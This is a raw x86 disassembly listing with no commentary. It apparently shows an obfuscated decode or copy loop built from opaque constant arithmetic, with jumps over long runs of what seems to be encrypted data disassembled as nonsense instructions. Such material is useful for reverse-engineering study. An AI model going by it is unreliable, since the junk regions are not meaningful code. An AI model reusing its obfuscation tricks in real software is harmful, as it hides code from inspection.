  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x422708
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	jno    0x40a7e7
  40a7d8:	push   0xffffffd1
  40a7da:	(bad)  
  40a7db:	lahf   
  40a7dc:	mov    esi,0xbec2a9be
  40a7e1:	mov    esi,0xd9793146
  40a7e6:	rcl    DWORD PTR [ecx+0x750408c0],1
  40a7ec:	movd   DWORD PTR [esp+ecx*4-0x202c90e],mm4
  40a7f4:	mov    bh,0xf3
  40a7f6:	xchg   esi,eax
  40a7f7:	fimul  DWORD PTR ss:[ebp+0x869f674]
  40a7fe:	mov    bh,0x2d
  40a800:	aam    0x72
  40a802:	xor    ecx,DWORD PTR [edx+0x73]
  40a805:	add    eax,0x9dde77b3
  40a80a:	fwait
  40a80b:	ss (bad) 
  40a80d:	or     BYTE PTR [esi-0x12],dl
  40a810:	mov    es,WORD PTR [edx+ebx*4-0x50b3cd52]
  40a817:	xchg   ebx,eax
  40a818:	(bad)  
  40a819:	rcl    BYTE PTR [ecx],1
  40a81b:	outs   dx,BYTE PTR ds:[esi]
  40a81c:	mov    DWORD PTR [eax+0x1],edx
  40a81f:	ins    DWORD PTR es:[edi],dx
  40a820:	inc    esi
  40a821:	push   ecx
  40a822:	outs   dx,DWORD PTR ds:[esi]
  40a823:	adc    DWORD PTR [esi-0x58],0x44ea023c
  40a82a:	mov    ch,0xef
  40a82c:	in     eax,0xbf
  40a82e:	pop    ebx
  40a82f:	push   esp
  40a830:	jle    0x40a847
  40a832:	ja     0x40a8aa
  40a834:	dec    ebx
  40a835:	hlt    
  40a836:	inc    ebx
  40a837:	xor    DWORD PTR [eax],0xe09b342b
  40a83d:	mov    cl,0x5e
  40a83f:	xchg   edx,eax
  40a840:	loop   0x40a880
  40a842:	rcl    BYTE PTR [edi-0x2c],0x3c
  40a846:	or     al,0x9a
  40a848:	sub    bl,bh
  40a84a:	pop    ecx
  40a84b:	mov    cs,WORD PTR [esi-0x6846614a]
  40a851:	jge    0x40a824
  40a853:	sub    ecx,DWORD PTR [ecx]
  40a855:	pop    ebx
  40a856:	(bad)  
  40a857:	pop    edx
  40a858:	add    ecx,DWORD PTR [ecx+0x1111bef]
  40a85e:	mov    ds:0x15f0ddf2,al
  40a863:	mov    BYTE PTR [eax-0xf],bl
  40a866:	adc    BYTE PTR [ecx-0x75],al
  40a869:	hlt    
  40a86a:	mov    WORD PTR [edi+0x4ba1a46],fs
  40a870:	and    eax,0x37d9ad44
  40a875:	jbe    0x40a7fa
  40a877:	(bad)  
  40a878:	repz jmp 0xa0f7:0xd8447953
  40a880:	inc    edx
  40a881:	mov    bp,0x1f2a
  40a885:	xor    bh,BYTE PTR [eax]
  40a887:	fisttp DWORD PTR [ebx+0x27]
  40a88a:	in     eax,0xb5
  40a88c:	push   esp
  40a88d:	pusha  
  40a88e:	adc    al,0xff
  40a890:	(bad)  
  40a891:	mov    dl,0xc5
  40a893:	fwait
  40a894:	add    al,0x33
  40a896:	stos   BYTE PTR es:[edi],al
  40a897:	inc    ecx
  40a898:	add    BYTE PTR [ebp-0x40],bh
  40a89b:	repnz (bad) 
  40a89d:	mov    bl,0x85
  40a89f:	shl    DWORD PTR [esi+ebx*2-0x76],0xf9
  40a8a4:	xor    eax,0xce61ec45
  40a8a9:	mov    DWORD PTR [eax+0x74],ebp
  40a8ac:	stc    
  40a8ad:	cmp    DWORD PTR [edx+eax*8-0x2f546540],esp
  40a8b4:	inc    ebp
  40a8b5:	xchg   edx,eax
  40a8b6:	out    dx,eax
  40a8b7:	dec    ebx
  40a8b8:	pusha  
  40a8b9:	xchg   ebp,eax
  40a8ba:	enter  0x54ec,0x27
  40a8be:	mov    ebx,0xb834eba5
  40a8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8c4:	mov    edx,0xdac7cbfa
  40a8c9:	mov    al,ds:0x38842b11
  40a8ce:	or     edx,DWORD PTR [eax]
  40a8d0:	cmp    cl,BYTE PTR [esi]
  40a8d2:	clc    
  40a8d3:	mov    al,ds:0x763c07ee
  40a8d8:	test   eax,0x522f8c2e
  40a8dd:	popf   
  40a8de:	cli    
  40a8df:	das    
  40a8e0:	push   ds
  40a8e1:	or     esp,eax
  40a8e3:	sbb    dl,cl
  40a8e5:	dec    ebx
  40a8e6:	sbb    al,0x5d
  40a8e8:	pop    edx
  40a8e9:	mov    ds:0x929e07cb,eax
  40a8ee:	div    BYTE PTR [esi-0x3a]
  40a8f1:	cmp    ah,BYTE PTR [esi+0x36]
  40a8f4:	nop
  40a8f5:	sbb    bh,al
  40a8f7:	mov    dh,0xbf
  40a8f9:	xchg   ebx,eax
  40a8fa:	rol    BYTE PTR [ecx+0x8],0xc0
  40a8fe:	sub    ch,BYTE PTR [esi+0x2c]
  40a901:	mov    ebp,0xbbf86135
  40a906:	xor    esi,DWORD PTR [ebx]
  40a908:	fmul   QWORD PTR [ebx-0x9ca5241]
  40a90e:	repz xor ebx,ecx
  40a911:	xchg   DWORD PTR [eax-0x1bde817a],ecx
  40a917:	mov    cl,0xed
  40a919:	pop    ecx
  40a91a:	jmp    0x234d7a46
  40a91f:	dec    BYTE PTR [edi+eax*8]
  40a922:	popf   
  40a923:	dec    esi
  40a924:	std    
  40a925:	mov    bh,0x48
  40a927:	call   0x5b25:0xb9ea60c4
  40a92e:	jp     0x40a920
  40a930:	fdivr  DWORD PTR [eax]
  40a932:	pop    ss
  40a933:	cmp    DWORD PTR [ecx+0x38c7b0fd],0x3057caa2
  40a93d:	pop    ebp
  40a93e:	clc    
  40a93f:	ficomp DWORD PTR [edx]
  40a941:	xor    al,0x43
  40a943:	dec    ecx
  40a944:	xor    bh,dl
  40a946:	push   cs
  40a947:	stos   DWORD PTR es:[edi],eax
  40a948:	mov    ecx,0x808bac75
  40a94d:	inc    eax
  40a94e:	leave  
  40a94f:	shl    BYTE PTR [edi],1
  40a951:	mov    eax,ds:0xe431538a
  40a956:	lahf   
  40a957:	add    bh,BYTE PTR [esi+esi*4]
  40a95a:	shr    DWORD PTR [ecx-0x59],1
  40a95d:	pop    eax
  40a95e:	test   eax,0x68ce46ae
  40a963:	dec    esp
  40a964:	add    al,0x18
  40a966:	xor    DWORD PTR [eax+0x34],ebx
  40a969:	out    dx,eax
  40a96a:	lods   al,BYTE PTR ds:[esi]
  40a96b:	cli    
  40a96c:	lock icebp 
  40a96e:	jecxz  0x40a965
  40a970:	mov    cl,0x73
  40a972:	mov    cl,0x87
  40a974:	leave  
  40a975:	xchg   DWORD PTR [edi+0x6cda076c],ebx
  40a97b:	jb     0x40a941
  40a97d:	inc    eax
  40a97e:	xchg   edi,eax
  40a97f:	jle    0x40a9e9
  40a981:	mov    cl,0x7d
  40a983:	push   ecx
  40a984:	mov    ebp,0x2adde6ef
  40a989:	(bad)  
  40a98a:	mov    dl,0xf7
  40a98c:	sbb    eax,0x4daaba6
  40a991:	mov    eax,0xb71e155d
  40a996:	jae    0x40a96d
  40a998:	mov    ah,0x94
  40a99a:	(bad)
  40a99d:	(bad)  
  40a99e:	(bad)  
  40a99f:	(bad)  
  40a9a0:	mov    ah,0x6e
  40a9a2:	inc    edi
  40a9a3:	ficom  WORD PTR [ebx+esi*1]
  40a9a6:	lods   al,BYTE PTR ds:[esi]
  40a9a7:	mov    ebp,0x1b080e39
  40a9ac:	mov    dh,0x42
  40a9ae:	and    bh,BYTE PTR [esi+0x4e1cb2b4]
  40a9b4:	stos   DWORD PTR es:[edi],eax
  40a9b5:	fdivr  st,st(3)
  40a9b7:	loop   0x40aa0e
  40a9b9:	jns    0x40a9ee
  40a9bb:	lods   eax,DWORD PTR ds:[esi]
  40a9bc:	add    eax,0x7b65433a
  40a9c1:	mov    dh,0x17
  40a9c3:	jbe    0x40a9cf
  40a9c5:	cmp    ebx,DWORD PTR [esi+0x3c]
  40a9c8:	adc    BYTE PTR [edi-0x42],cl
  40a9cb:	gs in  al,0x19
  40a9ce:	xchg   ebp,eax
  40a9cf:	sub    eax,0xc5d5ea01
  40a9d4:	dec    ebx
  40a9d5:	out    0xda,eax
  40a9d7:	call   0x16bb:0x79c3bf01
  40a9de:	mov    dh,0xdf
  40a9e0:	outs   dx,DWORD PTR ds:[esi]
  40a9e1:	xor    edi,DWORD PTR [edi]
  40a9e3:	std    
  40a9e4:	xor    al,0x57
  40a9e6:	jmp    0xe75ac8dc
  40a9eb:	das    
  40a9ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ed:	mov    bl,0xe6
  40a9ef:	shl    DWORD PTR [ebx-0x7f46a6a9],0x68
  40a9f6:	jg     0x40a986
  40a9f8:	rol    BYTE PTR [ebp+0xc085071],1
  40a9fe:	ret    0xda8f
  40aa01:	mov    edx,0x3b8e74d5
  40aa06:	das    
  40aa07:	jae    0x40aa18
  40aa09:	pop    esp
  40aa0a:	(bad)  
  40aa0b:	dec    esi
  40aa0c:	jo     0x40a9a1
  40aa0e:	and    DWORD PTR [edx+0x35742cee],edx
  40aa14:	dec    ebx
  40aa15:	data16 ss jbe 0x40aa78
  40aa19:	jmp    0x292f6cee
  40aa1e:	push   0x47
  40aa20:	pop    ebx
  40aa21:	(bad)  
  40aa22:	fcomi  st,st(0)
  40aa24:	or     ecx,DWORD PTR [ebx+ecx*8-0x3d15e575]
  40aa2b:	cmp    dl,bl
  40aa2d:	bound  ebx,QWORD PTR [ebp+0x4053edfd]
  40aa33:	jecxz  0x40aa78
  40aa35:	ret    0x9057
  40aa38:	mov    ebp,0x692d22f6
  40aa3d:	dec    ebx
  40aa3e:	sbb    dh,BYTE PTR [ebx]
  40aa40:	outs   dx,BYTE PTR ds:[esi]
  40aa41:	or     BYTE PTR [eax+ecx*8],0xe2
  40aa45:	retf   0xb54c
  40aa48:	out    0xe1,eax
  40aa4a:	faddp  st(1),st
  40aa4c:	xor    eax,0xac43010d
  40aa51:	sbb    BYTE PTR [edx+ebp*8-0x2f],0x28
  40aa56:	inc    al
  40aa58:	lahf   
  40aa59:	retf   0x62b6
  40aa5c:	sub    eax,edx
  40aa5e:	xor    edx,edx
  40aa60:	div    esi
  40aa62:	mov    esi,0xdbd
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	dec    ebp
  40aa9f:	pop    es
  40aaa0:	fist   WORD PTR [eax-0x41415a16]
  40aaa6:	test   eax,0xd7bebec2
  40aaab:	rol    BYTE PTR [ecx-0x3c],cl
  40aaae:	popw   ss
  40aab0:	std    
  40aab1:	xor    eax,ebp
  40aab3:	add    bh,al
  40aab5:	dec    edi
  40aab6:	(bad)  
  40aab8:	sub    eax,0xc0c50647
  40aabd:	int3   
  40aabe:	push   esp
  40aabf:	daa    
  40aac0:	mov    esi,0x1b279a9c
  40aac5:	push   eax
  40aac6:	or     BYTE PTR [ecx-0x7e],bl
  40aac9:	jbe    0x40aa55
  40aacb:	jb     0x40aaa7
  40aacd:	lock aas 
  40aacf:	or     cl,BYTE PTR [esi+0x4aa0629f]
  40aad5:	push   0x7d
  40aad7:	stc    
  40aad8:	jp     0x40aada
  40aada:	mov    WORD PTR [edi-0x2ab77229],ds
  40aae0:	in     eax,0x18
  40aae2:	stc    
  40aae3:	sbb    ecx,DWORD PTR [ebx-0x740aaea]
  40aae9:	xor    bh,ah
  40aaeb:	xchg   edi,eax
  40aaec:	sub    eax,0x7a873811
  40aaf1:	sbb    eax,0xeedb87dd
  40aaf6:	jecxz  0x40aad0
  40aaf8:	and    al,0x4c
  40aafa:	inc    edx
  40aafb:	les    edi,FWORD PTR [ebx+edi*4+0x7f]
  40aaff:	xchg   esp,eax
  40ab00:	xor    eax,0x8aa62204
  40ab05:	popf   
  40ab06:	and    BYTE PTR [eax+edi*8+0x23d4d3d8],bl
  40ab0d:	mov    ah,0x4d
  40ab0f:	shr    BYTE PTR [edi+0x19],cl
  40ab12:	int    0xca
  40ab14:	inc    eax
  40ab15:	mov    ebx,0xe87ddeec
  40ab1a:	push   ecx
  40ab1b:	cdq    
  40ab1c:	cli    
  40ab1d:	dec    esp
  40ab1e:	retf   
  40ab1f:	cld    
  40ab20:	adc    DWORD PTR [ebx],esi
  40ab22:	dec    esp
  40ab23:	dec    esi
  40ab24:	call   0x3e60:0xef06b237
  40ab2b:	jmp    0x40aab3
  40ab2d:	mov    edx,DWORD PTR ds:0xd1f6a15c
  40ab33:	stos   BYTE PTR es:[edi],al
  40ab34:	dec    ecx
  40ab35:	dec    esp
  40ab36:	ficomp DWORD PTR [esi+0x5fb4abc5]
  40ab3c:	mov    BYTE PTR [ebx+0x3d],ah
  40ab3f:	xor    al,BYTE PTR [edi+0x5638c970]
  40ab45:	in     eax,0xb3
  40ab47:	mov    dl,0xdb
  40ab49:	xor    al,0xdb
  40ab4b:	je     0x40aba2
  40ab4d:	out    dx,eax
  40ab4e:	loop   0x40ab54
  40ab50:	xor    DWORD PTR [edi],ebx
  40ab52:	mov    edx,0xc733b4f0
  40ab57:	cdq    
  40ab58:	mov    ecx,0xf320ff10
  40ab5d:	dec    esi
  40ab5e:	addr16 pop edx
  40ab60:	and    BYTE PTR [eax-0x4c],ch
  40ab63:	pop    edi
  40ab64:	or     eax,0xe1f59291
  40ab69:	(bad)  
  40ab6a:	stc    
  40ab6b:	xchg   edi,eax
  40ab6c:	cmp    dh,BYTE PTR [ecx+0xf]
  40ab6f:	xor    BYTE PTR [esp+ebx*2],dh
  40ab72:	ds dec esp
  40ab74:	cmp    eax,0x9405977e
  40ab79:	jp     0x40abb2
  40ab7b:	nop
  40ab7c:	out    dx,al
  40ab7d:	rcr    dh,cl
  40ab7f:	sub    bh,BYTE PTR [ecx]
  40ab81:	gs cli 
  40ab83:	push   0x1f
  40ab85:	ins    DWORD PTR es:[edi],dx
  40ab86:	pop    esi
  40ab87:	aad    0x8
  40ab89:	in     eax,dx
  40ab8a:	push   edi
  40ab8b:	push   esi
  40ab8c:	fidivr DWORD PTR [ecx+0x307c8428]
  40ab92:	jmp    0x40abbd
  40ab94:	push   ebx
  40ab95:	leave  
  40ab96:	int3   
  40ab97:	cmp    bh,BYTE PTR [eax]
  40ab99:	add    edx,ebp
  40ab9b:	imul   edi,DWORD PTR [edi-0x5e1fb604],0x5d794917
  40aba5:	aad    0xd8
  40aba7:	mov    eax,ds:0x1691832f
  40abac:	out    dx,eax
  40abad:	xor    ah,ch
  40abaf:	mov    ds:0x9b4a317b,al
  40abb4:	test   dl,bl
  40abb6:	ss imul edx,esi,0xe49bf8a1
  40abbd:	and    ah,BYTE PTR [eax]
  40abbf:	dec    esp
  40abc0:	test   esp,0xe442573e
  40abc6:	add    BYTE PTR [ebx],dl
  40abc8:	aam    0x40
  40abca:	xchg   edx,eax
  40abcb:	cld    
  40abcc:	lods   al,BYTE PTR ds:[esi]
  40abcd:	push   esp
  40abce:	pop    ss
  40abcf:	xchg   ecx,eax
  40abd0:	sbb    DWORD PTR [ecx-0x73158786],0xffffffc2
  40abd7:	mov    dh,0xbf
  40abd9:	je     0x40abe1
  40abdb:	int3   
  40abdc:	jmp    0x17d7ab79
  40abe1:	mov    bl,0x4e
  40abe3:	retf   
  40abe4:	xor    DWORD PTR [edi-0x3cb56fe4],edx
  40abea:	ins    BYTE PTR es:[edi],dx
  40abeb:	xor    ebx,DWORD PTR [eax+0x76]
  40abee:	inc    esi
  40abef:	cld    
  40abf0:	popf   
  40abf1:	mov    dl,0xe8
  40abf3:	cld    
  40abf4:	aad    0xea
  40abf6:	inc    ebx
  40abf7:	lahf   
  40abf8:	je     0x40abf9
  40abfa:	frstor [esi-0xf8f29e1]
  40ac00:	sahf   
  40ac01:	inc    ebx
  40ac02:	lea    esi,[eax]
  40ac04:	pop    edx
  40ac05:	sub    eax,0x586461bc
  40ac0a:	push   ebx
  40ac0b:	fs push ecx
  40ac0d:	mov    dh,0x68
  40ac0f:	inc    edx
  40ac10:	xchg   edi,eax
  40ac11:	fist   WORD PTR [eax]
  40ac13:	sub    BYTE PTR [edx],dh
  40ac15:	sbb    DWORD PTR [eax-0x41],ebp
  40ac18:	cmp    al,0xb1
  40ac1a:	sti    
  40ac1b:	lea    esp,[esi]
  40ac1d:	das    
  40ac1e:	xor    eax,0x35b5335d
  40ac23:	arpl   WORD PTR [ebp+0x5adf0bc7],di
  40ac29:	in     eax,0x47
  40ac2b:	mov    ds:0x546e0a4e,al
  40ac30:	les    ecx,FWORD PTR [ecx]
  40ac32:	mov    cl,0x48
  40ac34:	aas    
  40ac35:	lea    ebp,[eax+0x34]
  40ac38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac39:	push   ebx
  40ac3a:	stos   DWORD PTR es:[edi],eax
  40ac3b:	jmp    0xe2db:0xc1dcd267
  40ac42:	mov    dh,BYTE PTR [edx+0x4d]
  40ac45:	jmp    0x9f35:0xa8ed0bd6
  40ac4c:	jecxz  0x40ac3c
  40ac4e:	dec    eax
  40ac4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac50:	ss mov dh,0x21
  40ac53:	mov    edi,DWORD PTR [esi+0x44cd2d9b]
  40ac59:	call   0xc45:0x68efb27a
  40ac60:	dec    ecx
  40ac61:	outs   dx,DWORD PTR ds:[esi]
  40ac62:	das    
  40ac63:	and    al,0xce
  40ac65:	std    
  40ac66:	xor    al,0x9
  40ac68:	sub    BYTE PTR ds:0x87f563eb,bh
  40ac6e:	push   cs
  40ac6f:	sbb    eax,0xc62cafa3
  40ac74:	pop    esp
  40ac75:	rcl    BYTE PTR [esi-0x4a],0x94
  40ac79:	dec    edx
  40ac7a:	mov    dh,BYTE PTR [esi+0x719c888f]
  40ac80:	loope  0x40ac9d
  40ac82:	sbb    DWORD PTR [edx+0x26ce0f1f],edi
  40ac88:	cld    
  40ac89:	je     0x40ac8f
  40ac8b:	aas    
  40ac8c:	mov    edi,0x19eedc95
  40ac91:	mov    eax,DWORD PTR [edx+0x7f]
  40ac94:	(bad)  
  40ac95:	cli    
  40ac96:	les    edx,FWORD PTR ds:0xdbe5e00c
  40ac9c:	fisttp WORD PTR [ebx+ebx*1-0x31378671]
  40aca3:	and    ebp,DWORD PTR [ebx+ebx*2+0x5619b64b]
  40acaa:	sbb    edi,ebp
  40acac:	mov    eax,ecx
  40acae:	stc    
  40acaf:	add    edx,0x5e
  40acb2:	iret   
  40acb3:	mov    edi,ebp
  40acb5:	loopne 0x40ac42
  40acb7:	sbb    DWORD PTR [ebp+0x4911d54d],esp
  40acbd:	dec    ecx
  40acbe:	jnp    0x40ad36
  40acc0:	out    0x90,eax
  40acc2:	jmp    0x40ad1a
  40acc4:	neg    DWORD PTR [eax+0x42]
  40acc7:	lahf   
  40acc8:	ja     0x40ad1e
  40acca:	xor    BYTE PTR [ecx-0xc],ah
  40accd:	add    DWORD PTR [ebp-0x49650bbb],edx
  40acd3:	adc    ecx,esp
  40acd5:	dec    ebp
  40acd6:	mov    ah,BYTE PTR [edi+0x1f]
  40acd9:	scas   al,BYTE PTR es:[edi]
  40acda:	push   edi
  40acdb:	dec    ecx
  40acdc:	js     0x90cf687a
  40ace2:	int3   
  40ace3:	jecxz  0x40acf5
  40ace5:	xor    eax,0x6024c7d4
  40acea:	mov    dh,0xb6
  40acec:	test   eax,0xc437e8f8
  40acf1:	xchg   ebx,eax
  40acf2:	bound  edx,QWORD PTR [edi+0xb]
  40acf5:	mov    dh,0x5
  40acf7:	push   ebx
  40acf8:	sti    
  40acf9:	pop    edx
  40acfa:	jae    0x40ad5d
  40acfc:	jge    0x40ad02
  40acfe:	(bad)  
  40ad00:	ret    0x55e8
  40ad03:	sbb    eax,0x27482c52
  40ad08:	stos   BYTE PTR es:[edi],al
  40ad09:	popf   
  40ad0a:	imul   edi,DWORD PTR [ebx+0x6b425f1e],0x7e
  40ad11:	pop    es
  40ad12:	and    dl,0xca
  40ad15:	push   esp
  40ad16:	jae    0x40acc3
  40ad18:	xor    DWORD PTR [esi+0x3e],eax
  40ad1b:	pop    ebx
  40ad1c:	repz popf 
  40ad1e:	push   0xffffffd2
  40ad20:	iret   
  40ad21:	neg    BYTE PTR [edx-0x1a]
  40ad24:	xor    edx,edx
  40ad26:	mov    DWORD PTR [ebp-0x18],0x187
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x422708
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi+0x14985f90],bl
  40ad62:	sahf   
  40ad63:	aad    0xa9
  40ad65:	mov    esi,0xbec2a9be
  40ad6a:	mov    esi,0x8b101190
  40ad6f:	pop    ebx
  40ad70:	fld    st(4)
  40ad72:	(bad)  
  40ad73:	popf   
  40ad74:	sbb    DWORD PTR [ecx+0x74578649],0xffffffd7
  40ad7b:	(bad)  
  40ad7c:	pop    ss
  40ad7d:	jo     0x40adfa
  40ad7f:	xor    edi,eax
  40ad81:	pop    esi
  40ad82:	enter  0x4a2f,0x37
  40ad86:	ss push 0x6e
  40ad89:	dec    esi
  40ad8a:	push   esi
  40ad8b:	fcomp  QWORD PTR [eax-0x32]
  40ad8e:	aad    0xc5
  40ad90:	dec    ebx
  40ad91:	int3   
  40ad92:	sbb    ebp,eax
  40ad94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad95:	mov    esp,0x944f4ba2
  40ad9a:	ret    0xe158
  40ad9d:	or     DWORD PTR [ecx+eax*2+0xa],edx
  40ada1:	ins    BYTE PTR es:[edi],dx
  40ada2:	in     al,dx
  40ada3:	popf   
  40ada4:	sar    ch,cl
  40ada6:	xchg   DWORD PTR [edx-0x1d],esi
  40ada9:	(bad)  
  40adaa:	fwait
  40adab:	ins    DWORD PTR es:[edi],dx
  40adac:	cmp    bh,0x65
  40adaf:	fcomp  QWORD PTR [ecx]
  40adb1:	push   ss
  40adb2:	jbe    0x40ad3c
  40adb4:	stc    
  40adb5:	cmp    eax,0xcf32bbe5
  40adba:	icebp  
  40adbb:	pop    ebp
  40adbc:	lods   al,BYTE PTR ds:[esi]
  40adbd:	js     0x40ad54
  40adbf:	fild   QWORD PTR ds:0x6b4440b0
  40adc5:	fild   QWORD PTR [ecx+esi*4-0x3c]
  40adc9:	repnz mov esp,0xad7494ca
  40adcf:	pop    edi
  40add0:	jbe    0x40ad5e
  40add2:	or     dl,0x10
  40add5:	fidiv  DWORD PTR [edi]
  40add7:	les    eax,FWORD PTR [esi-0x37]
  40adda:	outs   dx,BYTE PTR ds:[esi]
  40addb:	int3   
  40addc:	xchg   esi,eax
  40addd:	jns    0x40adb6
  40addf:	stos   BYTE PTR es:[edi],al
  40ade0:	mov    eax,ds:0x874d1244
  40ade5:	in     al,0xa0
  40ade7:	arpl   bp,si
  40ade9:	xor    esi,DWORD PTR [edx+0x67]
  40adec:	pop    ecx
  40aded:	push   edx
  40adee:	sbb    eax,0xf86d0772
  40adf3:	or     al,0xec
  40adf5:	adc    BYTE PTR [ebp-0x50ca41a3],ah
  40adfb:	push   edi
  40adfc:	loope  0x40adb5
  40adfe:	cmp    al,0x7b
  40ae00:	dec    edx
  40ae01:	dec    ecx
  40ae02:	cdq    
  40ae03:	ja     0x40ada5
  40ae05:	pop    esp
  40ae06:	cdq    
  40ae07:	test   DWORD PTR [ebp-0x1f3daa81],eax
  40ae0d:	dec    ecx
  40ae0e:	xor    ch,BYTE PTR [edi-0x61]
  40ae11:	push   esi
  40ae12:	push   edi
  40ae13:	std    
  40ae14:	call   0xe133838c
  40ae19:	jo     0x40ae7b
  40ae1b:	push   cs
  40ae1c:	pushf  
  40ae1d:	sbb    bh,BYTE PTR ds:0xb9721df6
  40ae23:	aaa    
  40ae24:	xchg   BYTE PTR [eax+0x22],bl
  40ae27:	(bad)  
  40ae28:	call   DWORD PTR [ecx-0xc]
  40ae2b:	arpl   WORD PTR [ebx],cx
  40ae2d:	outs   dx,BYTE PTR ds:[esi]
  40ae2e:	mov    DWORD PTR [edi],ecx
  40ae30:	stos   DWORD PTR es:[edi],eax
  40ae31:	fsubr  DWORD PTR [edi+ecx*4-0x15]
  40ae35:	test   eax,0x7a794072
  40ae3a:	add    BYTE PTR [esp+ebx*4],bl
  40ae3d:	inc    edx
  40ae3e:	mov    cl,0x7f
  40ae40:	daa    
  40ae41:	cmp    al,0xaf
  40ae43:	mov    al,ds:0x97acb70f
  40ae48:	ds jnp 0x40ae9c
  40ae4b:	mov    edi,0x21985c42
  40ae50:	mov    al,ds:0x87cd72ab
  40ae55:	jl     0x40aece
  40ae57:	data16 jnp 0x40ae9e
  40ae5a:	addr16 test eax,0x71cf1660
  40ae60:	xlat   BYTE PTR ds:[ebx]
  40ae61:	add    BYTE PTR [ebp+0x7d0821eb],dl
  40ae67:	jo     0x40ae0a
  40ae69:	sub    ecx,ebx
  40ae6b:	cld    
  40ae6c:	sub    eax,0xe8853356
  40ae71:	bound  edx,QWORD PTR [edx+eax*2+0x18623db4]
  40ae78:	push   edx
  40ae7a:	xchg   esp,eax
  40ae7b:	icebp  
  40ae7c:	inc    esi
  40ae7d:	mov    bl,0xf1
  40ae7f:	test   BYTE PTR ds:0x8c49e427,bl
  40ae85:	shl    DWORD PTR [ebp+0x31],0xbe
